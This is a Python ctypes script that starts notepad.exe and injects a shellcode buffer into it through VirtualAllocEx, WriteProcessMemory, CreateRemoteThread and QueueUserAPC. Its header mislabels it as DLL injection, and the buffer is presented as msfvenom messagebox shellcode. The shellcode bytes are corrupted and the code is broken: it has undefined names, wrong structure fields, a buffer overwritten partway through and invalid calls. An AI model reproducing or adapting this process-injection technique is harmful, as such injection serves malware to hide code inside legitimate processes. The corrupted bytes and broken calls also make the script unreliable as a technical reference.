#!/usr/bin/env python3
'''
Date : 1402/01/15
Author : AmirhosseinKhanshabani - @AmirZoyber
 
Remote DLL Injection - Inject DLL into remote process

'''

from ctypes import *
from ctypes import wintypes
import subprocess

kernel = windll.kernel32
SIZE_T = c_size_t
LPSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

# VirtualAllocEx function which is used to allocate memory in the remote process
virtualAllocEx = kernel.VirtualAllocEx
virtualAllocEx.argtypes =  [wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD] 
virtualAllocEx.restype = wintypes.LPVOID

# WriteProcessMemory function which is used to write data into the remote process
WriteProcessMemory = kernel.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T)]
WriteProcessMemory.restype = wintypes.BOOL

MEM_COMMIT = 0x00001000 # Define MEM_COMMIT as 0x1000 which is used to allocate memory in the remote process
MEM_RESERVE = 0x00002000 # Define MEM_RESERVE as 0x2000 which is used to reserve memory in the remote process
PAGE_READWRITE = 0x04 # Define PAGE_READWRITE as 0x04 which is used to set the memory protection of the memory in the remote process
EXECUTE_IMMEDIATELY = 0x0 # Define EXECUTE_IMMEDIATELY as 0x00000000 which is used to set the thread execution state in the remote process
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF) # Define PROCESS_ALL_ACCESS as 0x001F0FFF which is used to set the access rights of the process in the remote process


# class _SECURITY_ATTRIBUTES(Structure): is used to define the security attributes of the process which is used to create the process and the thread in the remote process.
class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL),]

VirtualProtectEx = kernel.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPWORD)
VirtualProtectEx.restype = wintypes.BOOL

proccess = subprocess.Popen(["notepad.exe"])
print(f"[/] Starting process wit PID -> {proccess.pid}")


class STARTUPINFO(Structure):
    _fields_ = [("cb",wintypes.DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPSTR),
                ("lpTitle", LPSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.DWORD),
                ("cbReserved2", wintypes.DWORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)
                ]

class PROCESS_INFORMATION(Structure):
    _fields_ = [("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD)
                ]

createProcessA = kernel.CreateProcessA
createProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
createProcessA.restype = wintypes.BOOL

# msvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
buf = b""
buf += b"\xfc\x48\x81\xed\xfoO\xff\xff\xff\xe8\xde\xee\xee\xee"
buf += b"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b"
buf = b"\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
buf += b"\x48\x31\xc0@\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9"
buf += b"\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e\x48\x8b\x52"
buf += b"\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd@\x50\x3e\x8b"
buf += b"\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += b"\x48\x31\xc@\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += b"\x75\xf1\x3e\x4c\x@3\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd@\x66\x3e\x41\x8b"
buf += b"\x@4\x88\x48\x01\xde\x41\x58\x41\x58\x5e\x59\x5a\x41"
buf += b"\x00\x00\x00\x3e\x4c\x8d\x85\x04\x01\x00\x00\x48\x31"
buf += b"\xc9\x41\xba\x45\x83\x56\x07 \xff\xd5\x48\x31\xc9\x41"
buf += b"\xba\xf@\xb5\xa2\x56 \xff\xd5\x77\x6f\x72\x6c\x64\x00"
buf += b"\X68\x65\X6C\X6C\x6F\x00"


def verify(x):
    if not x:
        raise WinError()

startupInfo = STARTUPINFO()
startupInfo.cb = sizeof(startupInfo)

startupInfo.dwFlags = 1
startupInfo.wShowWindow = 1

processInfo = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = createProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_NEW_CONSOLE, None, None, byref(startupInfo), byref(processInfo))

verify(created)

pid = processInfo.pid
hProcess = processInfo.hProcess
threadID = processInfo.dwThreadID
hThread = processInfo.hThread

print(f"Started Process -> PID : {pid} | ThreadID : {threadID}")

remoteMemory = virtualAllocEx(handle=hProcess, size=len(buf), allocationType=MEM_COMMIT, protect=PAGE_EXECUTE_READWRITE)
verify(remoteMemory)
print(f"Allocated memory at -> {hex(remoteMemory)}")

writeProcessMemory = WriteProcessMemory(hProcess, remoteMemory, buf, len(buf), None)
verify(writeProcessMemory)
print(f"Written {len(buf)} bytes to -> {hex(remoteMemory)}")


oldProtect = wintypes.DWORD()
virtualProtectEx(hProcess, remoteMemory, len(buf), PAGE_EXECUTE_READ, byref(oldProtect))
verify(oldProtect)
print(f"Changed memory protection to -> {hex(oldProtect.value)}")

rthread = createRemoteThread(hProcess, None, 0, remoteMemory, None, 0, None)
verify(rthread)
print(f"Created remote thread -> {hex(rthread)}")

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = windll.kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

resumeThread = windll.kernel32.ResumeThread
resumeThread.argtypes = (wintypes.HANDLE,)
resumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remoteMemory), hThread, None)
verify(rqueue)
print(f"Queued APC Thread -> {hex(hThread)}")

rthread = resumeThread(hThread)
verify(rthread)
print(f"Resumed Thread -> {hex(hThread)}")
